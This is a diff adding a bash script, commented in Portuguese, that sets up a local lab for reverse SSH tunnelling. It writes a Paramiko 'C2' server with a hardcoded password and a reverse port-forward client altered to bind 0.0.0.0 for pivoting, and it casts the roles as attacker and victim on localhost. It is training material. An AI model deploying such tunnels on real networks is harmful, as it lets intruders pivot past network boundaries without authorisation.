@@ -1,0 +1,230 @@
+#!/bin/bash
+
+# Cores para output
+GREEN='\033[0;32m'
+BLUE='\033[0;34m'
+RED='\033[0;31m'
+NC='\033[0m' # No Color
+
+echo -e "${BLUE}[*] Configurando Laboratório Avançado (Versão Original Paramiko)...${NC}"
+
+# 1. Instalação de Dependências
+if ! command -v python3 &> /dev/null; then
+    echo -e "${RED}[!] Python3 não encontrado.${NC}"
+    exit 1
+fi
+# Tenta instalar via pip ou apt (para evitar erro de ambiente gerenciado)
+pip3 install paramiko --quiet 2>/dev/null || sudo apt-get install python3-paramiko -y &>/dev/null
+
+# 2. Gerando a Chave RSA
+echo -e "${GREEN}[+] Gerando chaves criptográficas...${NC}"
+rm -f test_rsa.key
+ssh-keygen -t rsa -f test_rsa.key -N "" -q
+
+# 3. Criando o Servidor C2 (ssh_server.py)
+# Mantemos nossa versão corrigida que aceita manter o túnel sem shell
+echo -e "${GREEN}[+] Escrevendo 'ssh_server.py' (C2)...${NC}"
+cat << 'EOF' > ssh_server.py
+import os
+import paramiko
+import socket
+import sys
+import threading
+import time
+
+CWD = os.path.dirname(os.path.realpath(__file__))
+HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))
+
+class Server(paramiko.ServerInterface):
+    def __init__(self):
+        self.event = threading.Event()
+    def check_channel_request(self, kind, chanid):
+        if kind == 'session' or kind == 'direct-tcpip':
+            return paramiko.OPEN_SUCCEEDED
+        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
+    def check_auth_password(self, username, password):
+        if (username == 'daniel') and (password == 'password'):
+            return paramiko.AUTH_SUCCESSFUL
+        return paramiko.AUTH_FAILED
+    def check_port_forward_request(self, address, port):
+        print(f"[*] Pedido de encaminhamento recebido para {address}:{port}")
+        return True
+
+if __name__ == '__main__':
+    # Escuta em todas as interfaces
+    server = '0.0.0.0'
+    ssh_port = 2222
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        sock.bind((server, ssh_port))
+        sock.listen(100)
+        print(f'[+] C2 ouvindo em {server}:{ssh_port}...')
+        client, addr = sock.accept()
+    except Exception as e:
+        print('[-] Falha na Escuta: ' + str(e))
+        sys.exit(1)
+    
+    print(f'[+] Conexão recebida de: {addr}')
+    
+    bhSession = paramiko.Transport(client)
+    bhSession.add_server_key(HOSTKEY)
+    server = Server()
+    try:
+        bhSession.start_server(server=server)
+    except paramiko.SSHException:
+        print("[-] Falha na negociação SSH.")
+        sys.exit(1)
+    
+    # Loop Infinito para segurar o túnel
+    try:
+        while bhSession.is_active():
+            time.sleep(1)
+    except KeyboardInterrupt:
+        bhSession.close()
+EOF
+
+# 4. Criando o Cliente Original (rforward.py)
+# Aqui usamos o código original do Paramiko com APENAS as correções necessárias
+echo -e "${GREEN}[+] Escrevendo 'rforward.py' (Código Original Adaptado)...${NC}"
+cat << 'EOF' > rforward.py
+#!/usr/bin/env python
+import getpass
+import os
+import socket
+import select
+import sys
+import threading
+from optparse import OptionParser
+import paramiko
+
+SSH_PORT = 22
+DEFAULT_PORT = 4000
+g_verbose = True
+
+def handler(chan, host, port):
+    sock = socket.socket()
+    try:
+        sock.connect((host, port))
+    except Exception as e:
+        verbose("Forwarding request to %s:%d failed: %r" % (host, port, e))
+        return
+
+    verbose(
+        "Connected!  Tunnel open %r -> %r -> %r"
+        % (chan.origin_addr, chan.getpeername(), (host, port))
+    )
+    while True:
+        r, w, x = select.select([sock, chan], [], [])
+        if sock in r:
+            data = sock.recv(1024)
+            if len(data) == 0:
+                break
+            chan.send(data)
+        if chan in r:
+            data = chan.recv(1024)
+            if len(data) == 0:
+                break
+            sock.send(data)
+    chan.close()
+    sock.close()
+    verbose("Tunnel closed from %r" % (chan.origin_addr,))
+
+def reverse_forward_tunnel(server_port, remote_host, remote_port, transport):
+    # CORREÇÃO 1: "0.0.0.0" para permitir acesso externo (Pivoting)
+    transport.request_port_forward("0.0.0.0", server_port)
+    while True:
+        chan = transport.accept(1000)
+        if chan is None:
+            continue
+        thr = threading.Thread(
+            target=handler, args=(chan, remote_host, remote_port)
+        )
+        # CORREÇÃO 2: Sintaxe moderna para threads daemon
+        thr.daemon = True
+        thr.start()
+
+def verbose(s):
+    if g_verbose:
+        print(s)
+
+def get_host_port(spec, default_port):
+    args = (spec.split(":", 1) + [default_port])[:2]
+    args[1] = int(args[1])
+    return args[0], args[1]
+
+def parse_options():
+    global g_verbose
+    parser = OptionParser(
+        usage="usage: %prog [options] <ssh-server>[:<server-port>]",
+        version="%prog 1.0",
+        description="Reverse SSH Tunneling Tool"
+    )
+    parser.add_option("-q", "--quiet", action="store_false", dest="verbose", default=True, help="squelch all informational output")
+    parser.add_option("-p", "--remote-port", action="store", type="int", dest="port", default=DEFAULT_PORT, help="port on server to forward (default: %d)" % DEFAULT_PORT)
+    parser.add_option("-u", "--user", action="store", type="string", dest="user", default=getpass.getuser(), help="username for SSH authentication")
+    parser.add_option("-K", "--key", action="store", type="string", dest="keyfile", default=None, help="private key file")
+    parser.add_option("", "--no-key", action="store_false", dest="look_for_keys", default=True, help="don't look for or use a private key file")
+    parser.add_option("-P", "--password", action="store_true", dest="readpass", default=False, help="read password from stdin")
+    parser.add_option("-r", "--remote", action="store", type="string", dest="remote", default=None, metavar="host:port", help="remote host and port to forward to")
+    options, args = parser.parse_args()
+
+    if len(args) != 1:
+        parser.error("Incorrect number of arguments.")
+    if options.remote is None:
+        parser.error("Remote address required (-r).")
+
+    g_verbose = options.verbose
+    server_host, server_port = get_host_port(args[0], SSH_PORT)
+    remote_host, remote_port = get_host_port(options.remote, SSH_PORT)
+    return options, (server_host, server_port), (remote_host, remote_port)
+
+def main():
+    options, server, remote = parse_options()
+    password = None
+    if options.readpass:
+        password = getpass.getpass("Enter SSH password: ")
+
+    client = paramiko.SSHClient()
+    client.load_system_host_keys()
+    client.set_missing_host_key_policy(paramiko.WarningPolicy())
+
+    verbose("Connecting to ssh host %s:%d ..." % (server[0], server[1]))
+    try:
+        client.connect(server[0], server[1], username=options.user, key_filename=options.keyfile, look_for_keys=options.look_for_keys, password=password)
+    except Exception as e:
+        print("*** Failed to connect to %s:%d: %r" % (server[0], server[1], e))
+        sys.exit(1)
+
+    verbose("Now forwarding remote port %d to %s:%d ..." % (options.port, remote[0], remote[1]))
+
+    try:
+        reverse_forward_tunnel(options.port, remote[0], remote[1], client.get_transport())
+    except KeyboardInterrupt:
+        print("C-c: Port forwarding stopped.")
+        sys.exit(0)
+
+if __name__ == "__main__":
+    main()
+EOF
+
+# 5. Instruções finais atualizadas
+echo -e "${BLUE}-------------------------------------------------------${NC}"
+echo -e "${GREEN}LABORATÓRIO PRONTO! (Scripts Gerados)${NC}"
+echo -e "${BLUE}-------------------------------------------------------${NC}"
+echo -e "Abra 3 terminais e execute nesta ordem:"
+echo -e ""
+echo -e "TERMINAL 1 (Simulando um serviço interno):"
+echo -e "  $ python3 -m http.server 9000"
+echo -e ""
+echo -e "TERMINAL 2 (Servidor C2 - Atacante):"
+echo -e "  $ sudo python3 ssh_server.py"
+echo -e ""
+echo -e "TERMINAL 3 (Cliente - Vítima):"
+echo -e "  Agora usando o script original com argumentos:"
+echo -e "  $ python3 rforward.py 127.0.0.1:2222 -p 8081 -r 127.0.0.1:9000 --user daniel --password"
+echo -e "  (Quando pedir a senha, digite: password)"
+echo -e ""
+echo -e "TERMINAL 4 (Teste):"
+echo -e "  $ curl http://127.0.0.1:8081"
+echo -e "${BLUE}-------------------------------------------------------${NC}"
